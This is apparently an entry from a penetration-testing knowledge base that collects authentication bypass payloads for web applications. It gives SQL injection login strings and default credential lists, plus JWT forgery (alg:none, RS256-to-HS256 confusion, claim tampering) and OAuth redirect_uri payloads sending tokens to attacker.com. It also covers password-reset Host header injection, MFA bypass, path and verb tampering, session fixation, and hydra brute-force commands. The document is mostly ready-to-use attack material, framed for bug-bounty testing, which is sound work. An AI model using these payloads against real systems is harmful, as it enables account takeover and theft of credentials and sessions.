---
id: "auth-bypass-payloads"
title: "Authentication Bypass Payloads & Techniques"
type: "payload"
category: "web-application"
subcategory: "authentication"
tags: ["auth", "bypass", "jwt", "oauth", "password-reset", "mfa", "payload"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["vulnerability-priority-matrix", "attack-workflow-chains"]
updated: "2026-04-04"
---

## Overview

Authentication bypass techniques and payloads targeting login flows, password resets, OAuth/OIDC, JWT, MFA, and session management. These are consistently high-impact findings across bug bounty programs.

## Payloads

### SQL Injection Auth Bypass

Bypass login forms via SQL injection in username/password fields

- **Contexts**: login-form
- **Severity**: critical

```
# Username field payloads
admin' --
admin' #
' OR 1=1 --
' OR '1'='1' --
' OR '1'='1' #
admin'/*
' UNION SELECT 1,'admin','password' --
') OR ('1'='1

# Password field payloads
' OR 1=1 --
' OR '1'='1
anything' OR 'x'='x
```

### Default Credentials

Common default credentials to test

- **Contexts**: login-form, admin-panel
- **Severity**: critical

```
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
test:test
guest:guest
administrator:administrator
admin:changeme
admin:P@ssw0rd
tomcat:tomcat
manager:manager
```

### JWT None Algorithm Attack

Bypass JWT signature verification by setting algorithm to "none"

- **Contexts**: jwt, api
- **Severity**: critical

```bash
# Original token header: {"alg":"HS256","typ":"JWT"}
# Modified header:       {"alg":"none","typ":"JWT"}

# Using jwt_tool
jwt_tool {token} -X a  # Test alg:none

# Manual: base64url encode header with alg:none, keep/modify payload, empty signature
# Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: (keep original or modify claims)
# Signature: (empty)
# Token: header.payload.

# Variations
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
```

### JWT Key Confusion (RS256 → HS256)

Switch asymmetric (RS256) to symmetric (HS256) using the public key as HMAC secret

- **Contexts**: jwt, api
- **Severity**: critical

```bash
# If you can obtain the public key (often at /jwks.json, /.well-known/jwks.json)
jwt_tool {token} -X k -pk public_key.pem

# Manual process:
# 1. Get public key from JWKS endpoint
# 2. Change header alg from RS256 to HS256
# 3. Sign the token using the public key as HMAC secret
```

### JWT Claim Manipulation

Modify JWT claims to escalate privileges

- **Contexts**: jwt, api
- **Severity**: high

```json
// Change role claim
{"sub":"user123","role":"admin","iat":1234567890}

// Change user ID
{"sub":"admin","user_id":"1","iat":1234567890}

// Add admin claim
{"sub":"user123","admin":true,"iat":1234567890}

// kid (Key ID) injection
// Header: {"alg":"HS256","kid":"../../../../../../dev/null"}
// Sign with empty string as secret
```

### OAuth Redirect URI Manipulation

Steal OAuth tokens via redirect_uri manipulation

- **Contexts**: oauth, login
- **Severity**: critical

```
# Open redirect in redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://legitimate.com@attacker.com
?redirect_uri=https://legitimate.com.attacker.com
?redirect_uri=https://legitimate.com%40attacker.com
?redirect_uri=https://legitimate.com%2F%2Fattacker.com
?redirect_uri=https://legitimate.com/callback?next=https://attacker.com

# Path traversal in redirect_uri
?redirect_uri=https://legitimate.com/callback/../../../attacker-controlled-page

# Subdomain matching bypass
?redirect_uri=https://anything.legitimate.com  (register matching subdomain)

# Fragment-based token theft
?redirect_uri=https://legitimate.com/callback#  (token appended as fragment)
```

### Password Reset Token Attacks

Exploit password reset flows

- **Contexts**: password-reset
- **Severity**: critical

```
# Host header injection (password reset link uses attacker domain)
POST /reset-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@target.com

# Double email parameter
email=victim@target.com&email=attacker@attacker.com
email=victim@target.com%0a%0dcc:attacker@attacker.com

# Token in response
# Check if reset token is returned in the HTTP response body
# Check if token is predictable (timestamp-based, sequential)

# Token reuse
# After using a reset token, try using it again
# Check if old tokens are invalidated when new one is requested

# IDOR in reset
POST /reset-password
token=VALID_TOKEN&user_id=VICTIM_ID  (change user_id)
```

### MFA Bypass Techniques

Bypass multi-factor authentication

- **Contexts**: mfa, login
- **Severity**: critical

```
# Response manipulation
# Intercept MFA verification response
# Change {"success":false} to {"success":true}
# Change HTTP 403 to 200

# Direct endpoint access
# After entering username/password, don't complete MFA
# Navigate directly to authenticated endpoint
# Check if session is partially authenticated

# Brute force backup codes
# Backup codes are often 6-8 digit numeric
# Check rate limiting on backup code endpoint
# Try 000000-999999 if no rate limit

# Race condition
# Send multiple MFA verification requests simultaneously
# One might succeed while rate limit applies to others

# Previous session reuse
# Log in with MFA, capture the authenticated session cookie
# Log out, log in again
# Apply the old session cookie to skip MFA

# OAuth/SSO bypass
# If MFA is only on direct login, try OAuth/SSO login flow
# Social login might bypass MFA requirement
```

### HTTP Verb Tampering

Bypass authentication by changing HTTP method

- **Contexts**: api, web
- **Severity**: high

```
# If GET /admin returns 403, try:
POST /admin
PUT /admin
PATCH /admin
DELETE /admin
OPTIONS /admin
HEAD /admin
TRACE /admin

# Custom methods
JEFF /admin
FOO /admin
```

### Path-Based Auth Bypass

Bypass path-based access controls

- **Contexts**: web, api
- **Severity**: high

```
# URL encoding
/admin → /%61dmin
/admin → /admin%00
/admin → /admin%20
/admin → /admin%09

# Path traversal
/admin → /./admin
/admin → /../admin
/admin → /admin/./
/admin → //admin
/admin → /Admin (case variation)
/admin → /admin;
/admin → /admin..;/

# Nginx-specific
/admin → /admin..;/anything  (Tomcat behind Nginx)

# IIS-specific  
/admin → /admin~1
/admin → /admin::$DATA
```

### Session Fixation

Force a known session ID onto the victim

- **Contexts**: session
- **Severity**: high

```
# Test if the app accepts session IDs from URL parameters
https://target.com/login?PHPSESSID=attacker_chosen_value
https://target.com/login;jsessionid=attacker_chosen_value

# Check if session ID changes after login
# If it doesn't → session fixation vulnerability

# Steps:
# 1. Get valid session from target
# 2. Send session URL to victim
# 3. Victim logs in (session remains same)
# 4. Attacker uses same session — now authenticated
```

### Registration-Based Bypass

Exploit user registration to gain unauthorized access

- **Contexts**: registration
- **Severity**: high

```
# Admin email takeover
Register with: admin@target.com (if email verification is weak)
Register with: admin@target.com%00@attacker.com

# Unicode normalization
Register as: ᴬdmin (Unicode A → normalized to "Admin")
Register as: admin℀ (Unicode ligature normalization)

# Case sensitivity
Register as: Admin (vs existing "admin")
Register as: ADMIN@TARGET.COM

# Trailing characters
Register as: admin@target.com (with trailing space)
Register as: admin@target.com\n
```

## Detection Tools

```bash
# JWT testing
jwt_tool {token} -M at -t {target} -rh "Authorization: Bearer"
jwt_tool {token} -X a    # None algorithm
jwt_tool {token} -X k    # Key confusion
jwt_tool {token} -I -pc role -pv admin  # Claim tampering

# Nuclei auth checks
nuclei -l targets.txt -tags auth,jwt,oauth,token,login,default-login

# Brute force (use responsibly, check scope)
hydra -l admin -P wordlist.txt {target} http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
```

## Detection Checklist

```
□ Test default credentials on all login forms
□ Test SQL injection in username/password fields
□ Check JWT implementation (none alg, key confusion, claim editing)
□ Test OAuth redirect_uri manipulation
□ Test password reset flow (host injection, token predictability)
□ Check MFA bypass (response manipulation, direct access, brute force)
□ Test HTTP verb tampering on protected endpoints
□ Test path-based bypass on admin panels
□ Check session management (fixation, prediction, rotation)
□ Test registration for account takeover patterns
```
